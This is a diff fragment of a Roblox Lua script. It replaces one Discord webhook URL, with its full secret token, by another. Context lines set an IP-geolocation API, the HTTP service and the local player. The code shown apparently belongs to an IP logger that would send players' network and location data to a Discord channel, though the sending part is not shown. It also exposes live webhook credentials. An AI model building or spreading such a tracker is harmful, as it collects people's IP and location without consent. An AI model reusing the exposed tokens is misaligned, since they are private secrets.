@@ -1,5 +1,5 @@
 local apiUrl = "https://ifconfig.co/json"
-local webhook = "https://webhook.lewisakura.moe/api/webhooks/1158130163255619604/2CdIySTtV0H9vOYqn8E3B3fdqKcS-uMHBnS5ATfsedFK-kMOsnz1xTdNXQv3WnNS2hUm/queue" -- Replace with your actual Discord webhook URL
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1161320867381383261/_mo5LCoe6KlIILEYu2kjynxqG1DiWujujo_jp1v5s1-DGSXcgDQ6ksWN1W48wVAlxFuz/queue" -- Replace with your actual Discord webhook URL
 local http = game:GetService("HttpService")
 local player = game.Players.LocalPlayer
 
